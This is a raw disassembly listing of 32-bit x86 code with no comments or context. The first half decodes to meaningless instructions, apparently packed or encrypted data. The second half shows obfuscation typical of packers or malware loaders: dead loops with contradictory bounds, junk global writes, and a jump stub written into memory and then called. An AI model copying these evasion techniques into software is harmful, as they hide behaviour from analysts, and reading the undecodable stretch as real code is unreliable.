  416cc5:	popf   
  416cc6:	add    BYTE PTR [ebp+0x1218a14f],cl
  416ccc:	test   al,0x9b
  416cce:	call   0x3ca6:0xffa12763
  416cd5:	inc    ebx
  416cd6:	push   eax
  416cd7:	in     al,0xb9
  416cd9:	mov    eax,ds:0x2999e3ce
  416cde:	sti    
  416cdf:	sar    DWORD PTR [edx+edi*2+0x3126f0da],0xd
  416ce7:	mov    DWORD PTR ds:0x82ec64eb,ebp
  416ced:	xor    eax,0xdf24e36e
  416cf2:	in     al,0xf5
  416cf4:	or     eax,0xaabfdb8f
  416cf9:	(bad)  
  416cfa:	out    dx,al
  416cfb:	push   0x70942178
  416d00:	test   bh,dh
  416d02:	cld    
  416d03:	icebp  
  416d04:	mov    esi,0xdb22a634
  416d09:	and    al,0xbb
  416d0b:	cs push esi
  416d0d:	out    dx,al
  416d0e:	sub    ebx,esp
  416d10:	not    bh
  416d12:	test   al,0x63
  416d14:	lods   al,BYTE PTR ds:[esi]
  416d15:	popf   
  416d16:	ret    0x2f4e
  416d19:	lods   eax,DWORD PTR ds:[esi]
  416d1a:	call   0x73bf037f
  416d1f:	iret   
  416d20:	mov    al,ds:0x323c6f20
  416d25:	xchg   ecx,eax
  416d26:	jl     0x416d46
  416d28:	inc    eax
  416d29:	pushf  
  416d2a:	aaa    
  416d2b:	mov    ebx,0xc6976951
  416d30:	xor    BYTE PTR [edi-0x15],dh
  416d33:	xor    ch,ch
  416d35:	mov    esi,0xa6f04511
  416d3a:	sub    DWORD PTR [eax-0x64],0x8b695e0e
  416d41:	sub    esp,edi
  416d43:	xchg   ecx,eax
  416d44:	bound  ebx,QWORD PTR [ebp+0x4a3a7025]
  416d4a:	hlt    
  416d4b:	shl    DWORD PTR [ebx+0x6a3346f9],1
  416d51:	ja     0x416d03
  416d53:	add    al,0xe6
  416d55:	int3   
  416d56:	stos   BYTE PTR es:[edi],al
  416d57:	mov    al,0x43
  416d59:	sub    ebx,DWORD PTR [edi+ebp*2]
  416d5c:	retf   
  416d5d:	xor    BYTE PTR [ebx],dl
  416d5f:	pop    ebx
  416d60:	pushf  
  416d61:	sti    
  416d62:	push   esi
  416d63:	imul   esi,DWORD PTR [esi+ebx*4],0x10ee0031
  416d6a:	push   esi
  416d6b:	loop   0x416d0c
  416d6d:	add    DWORD PTR [ebp+0x5e],ebp
  416d70:	push   ebp
  416d71:	xchg   edx,eax
  416d72:	out    0x8d,eax
  416d74:	pop    esi
  416d75:	iret   
  416d76:	inc    esp
  416d77:	retf   0xc0d3
  416d7a:	pop    ss
  416d7b:	scas   al,BYTE PTR es:[edi]
  416d7c:	ficomp DWORD PTR [edi]
  416d7e:	mov    bl,0x4f
  416d80:	lods   eax,DWORD PTR ds:[esi]
  416d81:	jnp    0x416d5d
  416d83:	jge    0x416dee
  416d85:	aaa    
  416d86:	outs   dx,DWORD PTR ds:[esi]
  416d87:	fmulp  st(6),st
  416d89:	adc    ah,ch
  416d8b:	mov    al,ds:0x1997bee4
  416d90:	mov    al,ds:0xb8a6269b
  416d95:	pop    ss
  416d96:	dec    ebp
  416d97:	inc    ebp
  416d98:	mov    ?,WORD PTR [esi]
  416d9a:	dec    edx
  416d9b:	and    cl,BYTE PTR [edi+0x7f9fd0ae]
  416da1:	outs   dx,DWORD PTR ds:[esi]
  416da2:	adc    eax,0xb1747c55
  416da7:	xchg   edi,eax
  416da8:	xor    eax,DWORD PTR [ebp+0x3]
  416dab:	fsubr  DWORD PTR [ecx-0x35]
  416dae:	inc    ecx
  416daf:	stos   DWORD PTR es:[edi],eax
  416db0:	mov    bh,0xff
  416db2:	cdq    
  416db3:	cmp    eax,DWORD PTR [ebx-0x7470b895]
  416db9:	mov    ch,dh
  416dbb:	dec    edx
  416dbc:	jmp    0x416e3b
  416dbe:	pop    esp
  416dbf:	js     0x416dc9
  416dc1:	mov    ds:0x404df668,al
  416dc6:	jl     0x416dac
  416dc8:	ret    
  416dc9:	cmp    DWORD PTR [ecx-0x58],ebx
  416dcc:	push   edi
  416dcd:	mov    bl,0x42
  416dcf:	scas   eax,DWORD PTR es:[edi]
  416dd0:	xor    eax,0xcc58b5e2
  416dd5:	fist   DWORD PTR [ebx-0x75]
  416dd8:	or     esi,DWORD PTR [ebp-0x6d0e4b2b]
  416dde:	mov    edi,0xc2ea0e46
  416de3:	gs shr edx,1
  416de6:	aam    0xb
  416de8:	outs   dx,DWORD PTR ds:[esi]
  416de9:	jge    0x416e63
  416deb:	pop    ds
  416dec:	int    0x71
  416dee:	mov    cx,0x2f16
  416df2:	ins    BYTE PTR es:[edi],dx
  416df3:	fs inc edi
  416df5:	pop    edx
  416df6:	dec    eax
  416df7:	lods   eax,DWORD PTR ds:[esi]
  416df8:	mov    bl,dl
  416dfa:	mov    edi,0x767c2f5d
  416dff:	ror    BYTE PTR [ebx],1
  416e01:	popf   
  416e02:	inc    esi
  416e03:	mov    dh,0x90
  416e05:	sti    
  416e06:	in     al,dx
  416e07:	push   eax
  416e08:	cs daa 
  416e0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e0b:	sub    ah,BYTE PTR [ebx+0x7aa26ce0]
  416e11:	mov    al,0xe6
  416e13:	mov    esi,0x2fec6dc5
  416e18:	inc    ebp
  416e19:	std    
  416e1a:	cmp    eax,0xefd0aac
  416e1f:	test   BYTE PTR [eax],dl
  416e21:	or     al,0x25
  416e23:	sar    DWORD PTR [edi-0x8467efb],0x8b
  416e2a:	sub    al,0xa2
  416e2c:	adc    ch,BYTE PTR [edi-0x49]
  416e2f:	xor    al,0x7f
  416e31:	cmp    ebx,DWORD PTR [esi]
  416e33:	aas    
  416e34:	adc    edi,edx
  416e36:	mov    ebp,0xefac31e8
  416e3b:	popf   
  416e3c:	or     cl,cl
  416e3e:	or     al,BYTE PTR [ebx]
  416e40:	loope  0x416dde
  416e42:	enter  0x4ad3,0xee
  416e46:	mov    al,ds:0xf585d036
  416e4b:	ins    BYTE PTR es:[edi],dx
  416e4c:	in     al,dx
  416e4d:	aam    0xcd
  416e4f:	dec    esp
  416e50:	or     DWORD PTR ss:[edx-0x1f10d9b5],edi
  416e57:	ja     0x416dde
  416e59:	xchg   esi,eax
  416e5a:	and    al,0xf2
  416e5c:	addr16 cmp al,0xe3
  416e5f:	and    DWORD PTR [ecx-0x36eb50b2],ecx
  416e65:	jmp    0x9b54a47a
  416e6a:	stos   DWORD PTR es:[edi],eax
  416e6b:	jecxz  0x416dfd
  416e6d:	stc    
  416e6e:	loop   0x416e09
  416e70:	xor    al,0x86
  416e72:	cli    
  416e73:	push   ecx
  416e74:	dec    edi
  416e75:	add    DWORD PTR [eax],esp
  416e77:	jmp    DWORD PTR [esi]
  416e79:	out    dx,al
  416e7a:	in     eax,dx
  416e7b:	add    DWORD PTR [eax-0x6e],ebp
  416e7e:	adc    eax,esi
  416e80:	push   0xff09b12c
  416e85:	cmc    
  416e86:	call   0x968ac72d
  416e8b:	cli    
  416e8c:	(bad)  
  416e8d:	sub    DWORD PTR ds:0xed4c180a,edi
  416e93:	imul   esp,DWORD PTR [edi],0x9105cdfc
  416e99:	dec    bl
  416e9b:	lahf   
  416e9c:	mov    es,WORD PTR [edx-0x8627f38]
  416ea2:	mov    al,ds:0x5bb0b183
  416ea7:	lods   eax,DWORD PTR ds:[esi]
  416ea8:	push   cs
  416ea9:	(bad)  
  416eaa:	pop    ecx
  416eab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416eac:	push   0xb
  416eae:	out    dx,eax
  416eaf:	push   0x152a656d
  416eb4:	dec    esi
  416eb5:	pusha  
  416eb6:	adc    al,BYTE PTR [edx-0x4fe1a409]
  416ebc:	(bad)  
  416ebd:	out    0xda,al
  416ebf:	test   eax,0xcb02d923
  416ec4:	cmp    dl,BYTE PTR [ebx-0x1802561e]
  416eca:	push   edx
  416ecb:	or     cl,al
  416ecd:	mov    dh,0x60
  416ecf:	mov    ?,WORD PTR [edi+0x338e95dc]
  416ed5:	fs push ds
  416ed7:	push   es
  416ed8:	inc    edx
  416ed9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416eda:	xor    BYTE PTR [ebx+eax*4+0x41713efa],dh
  416ee1:	cmp    edx,eax
  416ee3:	push   esp
  416ee4:	mov    ecx,0xef275be0
  416ee9:	inc    BYTE PTR ds:[ecx-0x161d59f7]
  416ef0:	jecxz  0x416e8e
  416ef2:	stos   DWORD PTR es:[edi],eax
  416ef3:	loop   0x416f10
  416ef5:	jno    0x416f71
  416ef7:	nop
  416ef8:	xor    esi,DWORD PTR [ebx-0x26]
  416efb:	int3   
  416efc:	hlt    
  416efd:	or     DWORD PTR [ecx],0xffffffa3
  416f00:	mov    esi,ebp
  416f02:	bound  edx,QWORD PTR [ecx-0x24]
  416f05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f06:	sbb    eax,0x179bbffc
  416f0b:	or     DWORD PTR ds:0x505d68d8,edx
  416f11:	xor    ah,ah
  416f13:	xchg   ebp,eax
  416f14:	jae    0x416ebf
  416f16:	test   al,0x83
  416f18:	push   ebp
  416f19:	mov    esp,0x17369efc
  416f1e:	aam    0x2b
  416f20:	inc    edx
  416f21:	push   ds
  416f22:	xchg   ebx,eax
  416f23:	lds    esi,FWORD PTR [edx+0xfef9468]
  416f29:	loope  0x416ed8
  416f2b:	push   ecx
  416f2c:	not    BYTE PTR [edi-0x1d]
  416f2f:	sbb    eax,0xe4d0b211
  416f34:	test   ebp,ecx
  416f36:	mov    BYTE PTR [eax],al
  416f38:	push   ebp
  416f39:	push   eax
  416f3a:	cld    
  416f3b:	mov    cl,0xa1
  416f3d:	inc    edx
  416f3e:	fistp  WORD PTR [esi+0x77]
  416f41:	mov    esi,0x16a78458
  416f46:	push   edi
  416f47:	lods   al,BYTE PTR ds:[esi]
  416f48:	loop   0x416ed8
  416f4a:	(bad)
  416f4d:	sub    al,0x68
  416f4f:	jl     0x416f8c
  416f51:	xchg   DWORD PTR [ebx-0x4f],ebp
  416f54:	mov    al,ds:0x5cb4d242
  416f59:	push   edx
  416f5a:	push   edx
  416f5b:	add    ecx,DWORD PTR [esi*1+0x9645f83]
  416f62:	into   
  416f63:	stos   DWORD PTR es:[edi],eax
  416f64:	sbb    ah,BYTE PTR [ebx-0x4f]
  416f67:	adc    al,0x3b
  416f69:	mov    cl,0x48
  416f6b:	leave  
  416f6c:	dec    esp
  416f6d:	aam    0xb6
  416f6f:	sbb    BYTE PTR [eax],bh
  416f71:	xchg   edi,eax
  416f72:	jmp    DWORD PTR [esi+0xf]
  416f75:	fdiv   QWORD PTR [esi+0x42]
  416f78:	(bad)  
  416f7a:	pop    eax
  416f7b:	xor    DWORD PTR [eax],esi
  416f7d:	sbb    al,0x84
  416f7f:	or     eax,0xed333779
  416f84:	adc    al,0x4f
  416f86:	and    eax,0x7f2aba9c
  416f8b:	xor    esp,DWORD PTR ds:0xa082e138
  416f91:	jne    0x416f5a
  416f93:	sub    al,0x91
  416f95:	mov    WORD PTR [esi+0x4a0770ef],?
  416f9b:	xlat   BYTE PTR ds:[ebx]
  416f9c:	add    al,0xf3
  416f9e:	dec    ebx
  416f9f:	mov    ch,0x5c
  416fa1:	loope  0x416f30
  416fa3:	adc    DWORD PTR [ebx],ecx
  416fa5:	pop    edi
  416fa6:	das    
  416fa7:	and    DWORD PTR [ecx+0x3799ab6b],0x2f
  416fae:	pop    esp
  416faf:	pop    ecx
  416fb0:	dec    ecx
  416fb1:	stos   DWORD PTR es:[edi],eax
  416fb2:	or     edx,DWORD PTR [esp+edx*1]
  416fb5:	inc    esp
  416fb6:	mov    dl,0x94
  416fb8:	xor    DWORD PTR [esi-0x37b9c9a2],edi
  416fbe:	mov    ds:0xd256aacd,eax
  416fc3:	shl    BYTE PTR [ebx-0x76eeac53],1
  416fc9:	ret    0xb38e
  416fcc:	idiv   BYTE PTR [eax+0x2d]
  416fcf:	ret    0xccff
  416fd2:	je     0x416fad
  416fd4:	or     al,0x2d
  416fd6:	cld    
  416fd7:	lods   al,BYTE PTR ds:[esi]
  416fd8:	gs loop 0x416fad
  416fdb:	es cmp al,0xfa
  416fde:	inc    edx
  416fdf:	jmp    0x1dbc:0xdb05c11f
  416fe6:	jp     0x41704c
  416fe8:	pusha  
  416fe9:	mov    cs,WORD PTR [esi+0x6f]
  416fec:	inc    esp
  416fed:	(bad)  
  416fee:	sbb    eax,0x7ee363c4
  416ff3:	jmp    ebx
  416ff5:	lea    edi,[ebp+ebp*2+0x376fdcf6]
  416ffc:	adc    eax,0xb214c2b4
  417001:	sbb    ah,BYTE PTR [ecx+0x22]
  417004:	and    DWORD PTR [ecx+ebp*1+0x40e23032],esi
  41700b:	mov    DWORD PTR [edi+0x36],ebx
  41700e:	mov    edi,0xe8cf9c36
  417013:	je     0x41705f
  417015:	inc    edx
  417016:	inc    edx
  417017:	jo     0x417083
  417019:	lea    esp,ds:0xd52e0a86
  41701f:	pop    esi
  417020:	add    BYTE PTR ds:[edi-0x6b],dh
  417024:	mov    ah,0x65
  417026:	cmp    ah,BYTE PTR [ecx]
  417028:	scas   eax,DWORD PTR es:[edi]
  417029:	ja     0x416fb4
  41702b:	div    dl
  41702d:	retf   0xc6f
  417030:	imul   esi,DWORD PTR [ebp-0xe],0xffffffea
  417034:	paddsw mm5,QWORD PTR gs:[edx]
  417038:	mov    WORD PTR [eax+eiz*1-0x7e795c6a],?
  41703f:	mov    ch,0x3
  417041:	imul   ebx,DWORD PTR [edx+0x7e],0xffffffad
  417045:	jb     0x417089
  417047:	enter  0x76e0,0x1a
  41704b:	ret    0x3e5a
  41704e:	adc    ecx,DWORD PTR [eax]
  417050:	xchg   DWORD PTR [ebp+0x7668ef88],eax
  417056:	(bad)  
  417057:	cmp    DWORD PTR [eax],ebp
  417059:	xchg   edi,eax
  41705a:	sbb    al,0x1b
  41705c:	cmp    ebx,ecx
  41705e:	sub    eax,0xcb3227d4
  417063:	add    DWORD PTR [eax+edi*4],edx
  417066:	cmc    
  417067:	push   es
  417068:	fldenv [edx+ecx*8]
  41706b:	mov    ecx,0x750a8b91
  417070:	xor    ecx,DWORD PTR [ecx-0x4ca1ad03]
  417076:	daa    
  417077:	iret   
  417078:	xchg   ebp,eax
  417079:	mov    ?,WORD PTR [edi+0x4209c972]
  41707f:	fs sub eax,0xbed22359
  417085:	dec    DWORD PTR [edi+0x4e7f3b4]
  41708b:	push   ss
  41708c:	les    edx,FWORD PTR [edi]
  41708e:	je     0x417082
  417090:	push   edi
  417091:	(bad)  
  417092:	(bad)  
  417094:	sbb    eax,DWORD PTR [esi+edi*4+0x756d73dd]
  41709b:	inc    ebp
  41709c:	sbb    esp,edi
  41709e:	cmp    edx,DWORD PTR [esi]
  4170a0:	fsub   QWORD PTR es:[ebx+0x0]
  4170a4:	pop    ds
  4170a5:	add    DWORD PTR [ecx-0x69],esp
  4170a8:	test   DWORD PTR [esp+edi*2],ebp
  4170ab:	sar    DWORD PTR [ebx+esi*1],cl
  4170ae:	in     eax,dx
  4170af:	je     0x417130
  4170b1:	mov    edx,0x4a634129
  4170b6:	arpl   WORD PTR [edi-0x4c],bx
  4170b9:	cmp    dl,BYTE PTR [edi]
  4170bb:	xor    BYTE PTR [edi+eax*8+0x19],bh
  4170bf:	cmp    eax,0xc6bc2e59
  4170c4:	in     eax,dx
  4170c5:	add    DWORD PTR ds:0xa0f56cc8,esi
  4170cb:	rcr    ch,0xff
  4170ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170cf:	jns    0x41714a
  4170d1:	mov    eax,0x6090f8cf
  4170d6:	out    dx,al
  4170d7:	jns    0x41709b
  4170d9:	mov    bh,0x0
  4170db:	xor    ebx,ebp
  4170dd:	nop
  4170de:	in     al,0x81
  4170e0:	es inc esp
  4170e2:	into   
  4170e3:	mov    eax,0xb0e28c34
  4170e8:	enter  0x56ce,0x5d
  4170ec:	sub    dh,bh
  4170ee:	sub    BYTE PTR [edx],0x86
  4170f1:	adc    eax,0x444cb377
  4170f6:	add    dh,BYTE PTR [ecx-0x43]
  4170f9:	xchg   ebp,eax
  4170fa:	packuswb mm0,mm4
  4170fd:	outs   dx,DWORD PTR ds:[esi]
  4170fe:	push   ebp
  4170ff:	push   cs
  417100:	or     eax,0x9ae6ed1b
  417105:	mov    bh,0x66
  417107:	or     DWORD PTR [eax],edi
  417109:	adc    bh,cl
  41710b:	hlt    
  41710c:	clc    
  41710d:	push   cs
  41710e:	call   0xb268a71e
  417113:	add    cl,BYTE PTR [eax]
  417115:	rcr    DWORD PTR ds:0xae370b38,0x97
  41711c:	and    DWORD PTR [eax-0x4b153c0e],edi
  417122:	push   es
  417123:	sub    eax,ecx
  417125:	mov    DWORD PTR [ebp-0x8],eax
  417128:	mov    ecx,DWORD PTR [ebp-0x4]
  41712b:	xor    ecx,esi
  41712d:	mov    eax,0xffcd8d08
  417132:	sub    eax,ecx
  417134:	add    DWORD PTR [ebp-0x8],eax
  417137:	mov    eax,DWORD PTR [ebp-0x14]
  41713a:	mov    DWORD PTR [eax],0x675565e9
  417140:	mov    DWORD PTR [eax+0x4],0x76576787
  417147:	mov    eax,DWORD PTR [ebp-0x8]
  41714a:	mov    ecx,DWORD PTR [ebp-0x14]
  41714d:	push   DWORD PTR [ebp-0x24]
  417150:	mov    DWORD PTR [ecx+0x1],eax
  417153:	mov    eax,ds:0x4281e1
  417158:	push   DWORD PTR [eax]
  41715a:	push   DWORD PTR ds:0x428445
  417160:	push   DWORD PTR ds:0x4281e9
  417166:	push   DWORD PTR ds:0x428425
  41716c:	push   DWORD PTR ds:0x428c15
  417172:	push   DWORD PTR [ebp-0x28]
  417175:	push   DWORD PTR [ebp-0x2c]
  417178:	mov    eax,DWORD PTR [ebp-0x14]
  41717b:	call   eax
  41717d:	pop    edi
  41717e:	pop    esi
  41717f:	leave  
  417180:	ret    
  417181:	push   ebp
  417182:	mov    ebp,esp
  417184:	sub    esp,0x34
  417187:	add    DWORD PTR ds:0x428e9d,ebx
  41718d:	push   ebx
  41718e:	push   esi
  41718f:	movzx  esi,WORD PTR ds:0x428e39
  417196:	or     DWORD PTR ds:0x428e31,esi
  41719c:	push   edi
  41719d:	mov    DWORD PTR [ebp-0x10],0xf89f85b9
  4171a4:	lea    eax,[ebp+0x14]
  4171a7:	mov    DWORD PTR [ebp-0x4],eax
  4171aa:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  4171b1:	sub    ecx,DWORD PTR ds:0x428eb9
  4171b7:	lea    eax,[ebp-0xc]
  4171ba:	xor    edx,ecx
  4171bc:	mov    DWORD PTR [ebp-0x14],eax
  4171bf:	and    DWORD PTR ds:0x428e39,0x0
  4171c9:	jmp    0x4171db
  4171ce:	mov    ecx,DWORD PTR ds:0x428e39
  4171d4:	inc    ecx
  4171d5:	mov    DWORD PTR ds:0x428e39,ecx
  4171db:	cmp    DWORD PTR ds:0x428e39,0x18
  4171e2:	jae    0x417215
  4171e8:	cmp    DWORD PTR ds:0x428e39,0x1b
  4171ef:	jbe    0x417215
  4171f5:	jmp    0x417210
  4171fa:	push   0x39b5
  4171ff:	push   DWORD PTR [ebp-0x14]
  417202:	push   DWORD PTR [ebp-0x14]
  417205:	push   0x5237
  41720a:	call   DWORD PTR ds:0x42ca3c
  417210:	jmp    0x4171ce
  417215:	mov    eax,DWORD PTR [ebp-0xc]
  417218:	mov    edx,DWORD PTR [ebp-0x14]
  41721b:	or     DWORD PTR ds:0x428e85,edx
  417221:	mov    ecx,0x75108b1
  417226:	xor    eax,ecx
  417228:	dec    DWORD PTR ds:0x428e85
  41722e:	add    eax,0x3272f8
  417233:	and    DWORD PTR ds:0x428eb5,0x0
  41723d:	jmp    0x41724f
  417242:	mov    esi,DWORD PTR ds:0x428eb5
  417248:	inc    esi
  417249:	mov    DWORD PTR ds:0x428eb5,esi
  41724f:	cmp    DWORD PTR ds:0x428eb5,0x19
  417256:	jae    0x41729d
  41725c:	cmp    DWORD PTR ds:0x428eb5,0x9
  417263:	jl     0x41729d
  417269:	jmp    0x41727e
  41726e:	push   0x428019
  417273:	push   0x1
  417275:	push   DWORD PTR [ebp-0x24]
  417278:	call   DWORD PTR ds:0x42ca4c
  41727e:	cmp    DWORD PTR ds:0x428eb5,0x8
  417285:	jne    0x417298
  41728b:	mov    esi,DWORD PTR ds:0x428eb5
  417291:	inc    esi
  417292:	mov    DWORD PTR ds:0x428eb5,esi
  417298:	jmp    0x417242
  41729d:	mov    DWORD PTR [edx],eax
  41729f:	mov    eax,ds:0x4281dd
  4172a4:	mov    edx,DWORD PTR [ebp-0x4]
  4172a7:	mov    eax,DWORD PTR [eax]
  4172a9:	mov    DWORD PTR ds:0x428ecd,0x15
  4172b3:	cmp    DWORD PTR ds:0x428ecd,0x0
  4172ba:	je     0x417309
  4172c0:	cmp    DWORD PTR ds:0x428ecd,0x6
  4172c7:	jg     0x417309
  4172cd:	jmp    0x4172dd
  4172d2:	push   0x50d0
  4172d7:	call   DWORD PTR ds:0x42ca50
  4172dd:	cmp    DWORD PTR ds:0x428ecd,0x7
  4172e4:	jne    0x4172f7
  4172ea:	mov    esi,DWORD PTR ds:0x428ecd
  4172f0:	dec    esi
  4172f1:	mov    DWORD PTR ds:0x428ecd,esi
  4172f7:	mov    esi,DWORD PTR ds:0x428ecd
  4172fd:	dec    esi
  4172fe:	mov    DWORD PTR ds:0x428ecd,esi
  417304:	jmp    0x4172b3
  417309:	add    eax,DWORD PTR [edx]
  41730b:	mov    DWORD PTR [ebp-0x8],eax
  41730e:	mov    esi,DWORD PTR [ebp+0x8]
  417311:	sbb    DWORD PTR ds:0x428e71,ebx
  417317:	mov    eax,ds:0x428365
  41731c:	mov    DWORD PTR ds:0x428e8d,0x5de4
  417326:	mov    eax,DWORD PTR [eax+0x198]
  41732c:	and    DWORD PTR ds:0x428eb1,0x0
  417336:	jmp    0x417348
  41733b:	mov    edx,DWORD PTR ds:0x428eb1
  417341:	inc    edx
  417342:	mov    DWORD PTR ds:0x428eb1,edx
  417348:	cmp    DWORD PTR ds:0x428eb1,0x1b
  41734f:	jae    0x41737f
  417355:	cmp    DWORD PTR ds:0x428eb1,0x26
  41735c:	jle    0x41737f
  417362:	jmp    0x41737a
  417367:	push   DWORD PTR [ebp-0x14]
  41736a:	push   0x42819a
  41736f:	push   0x428e5d
  417374:	call   DWORD PTR ds:0x42ca54
  41737a:	jmp    0x41733b
  41737f:	xor    esi,ecx
  417381:	and    DWORD PTR ds:0x428ec1,0x0
  41738b:	jmp    0x41739d
  417390:	mov    edx,DWORD PTR ds:0x428ec1
  417396:	inc    edx
  417397:	mov    DWORD PTR ds:0x428ec1,edx
  41739d:	cmp    DWORD PTR ds:0x428ec1,0x1c
  4173a4:	jae    0x4173f1
  4173aa:	cmp    DWORD PTR ds:0x428ec1,0x8
  4173b1:	jb     0x4173f1
  4173b7:	jmp    0x4173d2
  4173bc:	push   DWORD PTR [ebp-0x24]
  4173bf:	push   0x14a9
  4173c4:	push   0x3838
  4173c9:	push   DWORD PTR [ebp-0x20]
  4173cc:	call   DWORD PTR ds:0x42ca58
  4173d2:	cmp    DWORD PTR ds:0x428ec1,0x7
  4173d9:	jne    0x4173ec
  4173df:	mov    edx,DWORD PTR ds:0x428ec1
  4173e5:	inc    edx
  4173e6:	mov    DWORD PTR ds:0x428ec1,edx
  4173ec:	jmp    0x417390
  4173f1:	mov    edx,0x3272f8
  4173f6:	or     DWORD PTR ds:0x428e59,0x2d0a
  417400:	add    esi,edx
  417402:	mov    DWORD PTR ds:0x428e4d,0x9a6
  41740c:	cmp    DWORD PTR [eax],esi
  41740e:	mov    DWORD PTR ds:0x428e65,0x2339
  417418:	je     0x41742f
  41741e:	mov    eax,DWORD PTR [eax]
  417420:	mov    DWORD PTR ds:0x428ebd,0x152e
  41742a:	jmp    0x41e3db
  41742f:	sbb    esi,eax
  417431:	mov    eax,DWORD PTR [ebp+0x18]
  417434:	mov    esi,DWORD PTR ds:0x428e2d
  41743a:	adc    DWORD PTR ds:0x428e61,esi
  417440:	mov    esi,DWORD PTR [ebp+0x1c]
  417443:	or     ebx,0xffffffff
  417446:	mov    DWORD PTR ds:0x428ed1,0x15d
  417450:	cmp    eax,0x70941f8a
  417455:	mov    DWORD PTR ds:0x428e8d,0x42c3
  41745f:	jne    0x4174aa
  417465:	mov    DWORD PTR ds:0x428e2d,0x1eb5
  41746f:	cmp    esi,ebx
  417471:	mov    DWORD PTR ds:0x428ead,0x35c3
  41747b:	jne    0x4174aa
  417481:	mov    DWORD PTR ds:0x428e65,0x33a3
  41748b:	push   ebx
  41748c:	mov    DWORD PTR ds:0x428e49,0x2fe2
  417496:	push   0x70941f94
  41749b:	mov    DWORD PTR ds:0x428e41,0x2336
  4174a5:	jmp    0x41e3ca
  4174aa:	mov    DWORD PTR ds:0x428ea5,ebx
  4174b0:	mov    eax,DWORD PTR [ebp+0x18]
  4174b3:	mov    esi,DWORD PTR [ebp+0x1c]
  4174b6:	cmp    eax,0x70941f94
  4174bb:	mov    DWORD PTR ds:0x428e61,0x2bd8
  4174c5:	jne    0x4174f2
  4174cb:	cmp    esi,ebx
  4174cd:	mov    DWORD PTR ds:0x428e2d,0x15b3
  4174d7:	jne    0x4174f2
  4174dd:	push   ebx
  4174de:	mov    DWORD PTR ds:0x428e75,0x4e72
  4174e8:	push   0x70941f96
  4174ed:	jmp    0x41e3ca
  4174f2:	mov    eax,ds:0x428e59
  4174f7:	mov    eax,DWORD PTR [ebp+0x18]
  4174fa:	mov    esi,DWORD PTR [ebp+0x1c]
  4174fd:	cmp    eax,0x70941f96
  417502:	jne    0x417543
  417508:	mov    DWORD PTR ds:0x428e99,0x434f
  417512:	cmp    esi,ebx
  417514:	jne    0x417543
  41751a:	mov    DWORD PTR ds:0x428ec9,0x341e
  417524:	push   ebx
  417525:	mov    DWORD PTR ds:0x428e85,0x3720
  41752f:	push   0x70941f90
  417534:	mov    DWORD PTR ds:0x428eb1,0x674c
  41753e:	jmp    0x41e3ca
  417543:	mov    eax,DWORD PTR [ebp+0x18]
  417546:	mov    esi,DWORD PTR [ebp+0x1c]
  417549:	mov    DWORD PTR ds:0x428e69,0x6330
  417553:	cmp    eax,0x70941f90
  417558:	jne    0x417599
  41755e:	cmp    esi,ebx
  417560:	mov    DWORD PTR ds:0x428e45,0x5688
  41756a:	jne    0x417599
  417570:	mov    DWORD PTR ds:0x428e69,0x61b3
  41757a:	push   ebx
  41757b:	mov    DWORD PTR ds:0x428e4d,0x6bb8
  417585:	push   0x70941f92
  41758a:	mov    DWORD PTR ds:0x428e2d,0x777c
  417594:	jmp    0x41e3ca
  417599:	mov    eax,DWORD PTR [ebp+0x18]
  41759c:	mov    edi,DWORD PTR ds:0x428e89
  4175a2:	mov    esi,DWORD PTR [ebp+0x1c]
  4175a5:	mov    edi,0x70941f9e
  4175aa:	mov    DWORD PTR ds:0x428ea1,0x2f43
  4175b4:	cmp    eax,edi
  4175b6:	mov    DWORD PTR ds:0x428eb1,0x498f
  4175c0:	jne    0x41e38b
  4175c6:	cmp    esi,ebx
  4175c8:	mov    DWORD PTR ds:0x428e71,0x5df9
  4175d2:	jne    0x41e38b
  4175d8:	sbb    eax,eax
  4175da:	mov    eax,DWORD PTR [ebp+0x10]
  4175dd:	and    DWORD PTR ds:0x428ea9,0x0
  4175e7:	jmp    0x4175fb
  4175ec:	xor    esi,esi
  4175ee:	xor    esi,DWORD PTR ds:0x428ea9
  4175f4:	inc    esi
  4175f5:	mov    DWORD PTR ds:0x428ea9,esi
  4175fb:	cmp    DWORD PTR ds:0x428ea9,0x1f
  417602:	jae    0x417655
  417608:	cmp    DWORD PTR ds:0x428ea9,0x5
  41760f:	jge    0x417655
  417615:	jmp    0x417636
  41761a:	push   DWORD PTR [ebp-0x10]
  41761d:	push   DWORD PTR [ebp-0x24]
  417620:	push   DWORD PTR [ebp-0x28]
  417623:	push   0x8725
  417628:	push   0x42814e
  41762d:	push   DWORD PTR [ebp-0x14]
  417630:	call   DWORD PTR ds:0x42ca10
  417636:	cmp    DWORD PTR ds:0x428ea9,0x4
  41763d:	jne    0x417650
  417643:	mov    esi,DWORD PTR ds:0x428ea9
  417649:	inc    esi
  41764a:	mov    DWORD PTR ds:0x428ea9,esi
  417650:	jmp    0x4175ec
  417655:	xor    eax,ecx
  417657:	add    eax,edx
  417659:	and    DWORD PTR ds:0x428e65,0x0
  417663:	jmp    0x417675
  417668:	mov    edi,DWORD PTR ds:0x428e65
  41766e:	inc    edi
  41766f:	mov    DWORD PTR ds:0x428e65,edi
  417675:	cmp    DWORD PTR ds:0x428e65,0x13
  41767c:	jae    0x4176b6
  417682:	cmp    DWORD PTR ds:0x428e65,0x15
  417689:	jbe    0x4176b6
  41768f:	jmp    0x4176b1
  417694:	push   DWORD PTR [ebp-0x20]
  417697:	push   0x1f3c
  41769c:	push   0x8271
  4176a1:	push   0x8e4d
  4176a6:	push   0x428ec5
  4176ab:	call   DWORD PTR ds:0x42ca14
  4176b1:	jmp    0x417668
  4176b6:	mov    DWORD PTR [ebp-0x20],eax
  4176b9:	mov    eax,DWORD PTR [ebp+0xc]
  4176bc:	mov    esi,DWORD PTR [ebp-0x8]
  4176bf:	xor    eax,ecx
  4176c1:	add    eax,edx
  4176c3:	imul   eax,DWORD PTR [esi]
  4176c6:	mov    esi,DWORD PTR [ebp+0x8]
  4176c9:	xor    esi,ecx
  4176cb:	add    esi,edx
  4176cd:	cmp    esi,eax
  4176cf:	mov    eax,DWORD PTR [ebp-0x4]
  4176d2:	mov    edi,0xffcd8d08
  4176d7:	je     0x4176f6
  4176dd:	mov    esi,DWORD PTR [ebp-0x20]
  4176e0:	add    DWORD PTR [eax],esi
